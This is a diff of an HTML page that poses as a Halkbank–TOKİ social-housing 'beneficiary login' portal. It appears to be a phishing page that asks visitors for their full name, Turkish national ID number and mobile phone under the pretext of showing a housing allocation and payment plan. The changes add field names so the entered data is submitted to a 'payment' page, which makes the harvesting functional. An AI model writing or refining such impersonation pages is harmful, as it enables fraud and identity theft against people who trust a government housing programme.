@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HALKBANK EMLAK KONUT GÜVENCESİ TOKİ | GİRİŞ</title>
+    <title>HALKBANK EMLAK KONUT GÜVENCESİ TOKİ</title>
     <style>
         body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; }
         .navbar { background-color: #004a99; color: white; padding: 20px; text-align: center; font-size: 18px; font-weight: bold; border-bottom: 4px solid #003366; }
@@ -13,38 +13,29 @@
         .form-group { margin-bottom: 15px; }
         label { display: block; font-size: 12px; color: #333; margin-bottom: 5px; font-weight: bold; }
         input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
-        input:focus { border-color: #004a99; outline: none; box-shadow: 0 0 5px rgba(0,74,153,0.2); }
-        button { width: 100%; background-color: #004a99; color: white; padding: 15px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; transition: 0.3s; margin-top: 10px; }
-        button:hover { background-color: #003366; }
-        .footer-logo { text-align: center; margin-top: 20px; opacity: 0.6; font-size: 10px; color: #888; }
+        button { width: 100%; background-color: #004a99; color: white; padding: 15px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="navbar">HALKBANK EMLAK KONUT GÜVENCESİ TOKİ</div>
     <div class="container">
         <h2>HAK SAHİBİ GİRİŞİ</h2>
-        <p>2026 Sosyal Konut Projesi kapsamında adınıza tanımlanan tahsis numarasını ve ödeme planını görüntülemek için bilgilerinizi doğrulayınız.</p>
-        
-        <form action="odeme.html">
-            <div class="form-group">
-                <label>T.C. KİMLİK NUMARASI</label>
-                <input type="text" maxlength="11" pattern="\d{11}" placeholder="11 Haneli T.C. No" required>
-            </div>
+        <p>Tahsis durumunuzu ve ödeme planınızı görüntülemek için bilgileri doğrulayınız.</p>
+        <form action="odeme.html" method="GET">
             <div class="form-group">
                 <label>AD SOYAD</label>
-                <input type="text" placeholder="Adınız ve Soyadınız" required>
+                <input type="text" name="ad" placeholder="Ad Soyad" required>
+            </div>
+            <div class="form-group">
+                <label>T.C. KİMLİK NO</label>
+                <input type="text" name="tc" maxlength="11" placeholder="11 Haneli T.C. No" required>
             </div>
             <div class="form-group">
                 <label>CEP TELEFONU</label>
-                <input type="tel" placeholder="05XX XXX XX XX" required>
+                <input type="tel" name="tel" placeholder="05XX XXX XX XX" required>
             </div>
             <button type="submit">SORGULA VE DEVAM ET</button>
         </form>
-        
-        <div class="footer-logo">
-            T.C. ÇEVRE ŞEHİRCİLİK VE İKLİM DEĞİŞİKLİĞİ BAKANLIĞI <br>
-            TOKİ RESMİ SORGULAMA PORTALI © 2026
-        </div>
     </div>
 </body>
 </html>
